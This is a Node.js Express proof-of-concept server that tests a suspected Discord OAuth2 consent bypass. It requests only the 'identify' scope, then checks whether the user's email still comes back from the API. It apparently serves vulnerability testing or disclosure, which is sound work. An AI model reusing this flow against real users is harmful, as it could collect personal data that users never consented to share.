require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
const port = 3000;

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = 'http://localhost:3000/callback';

// Main route: Generates the trapped/vulnerable link
app.get('/', (req, res) => {
    // This is WHERE the PoC is: we ask only for 'identify' scopes.
    // If the vulnerability is real, the Discord page will show 'email' to the user.
    const scopes = 'identify';
    const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${encodeURIComponent(scopes)}`;

    res.send(`
        <h1>PoC: Discord OAuth2 Consent Bypass</h1>
        <p>Click the link below to test authorization.</p>
        <a href="${authUrl}">Login with Discord (Test)</a>
    `);
});

// Callback route: Gets the code and requests the email
app.get('/callback', async (req, res) => {
    const code = req.query.code;

    if (!code) {
        return res.send('Error: No code received from Discord.');
    }

    try {
        // 1. Exchange the code for an Access Token
        const params = new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI
        });

        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', params.toString(), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        // 2. Use the Token to get user info
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        // 3. Show the proof
        const userData = userResponse.data;

        res.send(`
            <h1>Proof of Concept (Result)</h1>
            <p style="color: red; font-size: 20px;"><strong>Email retrieved: ${userData.email || 'NOT RETRIEVED'}</strong></p>
            <p>Here is all the data returned by the API:</p>
            <pre style="background: #eee; padding: 10px;">${JSON.stringify(userData, null, 2)}</pre>
        `);

    } catch (error) {
        console.error(error.response ? error.response.data : error.message);
        res.send('An error occurred. Check the server console.');
    }
});

app.listen(port, () => {
    console.log(`PoC Server started on http://localhost:${port}`);
});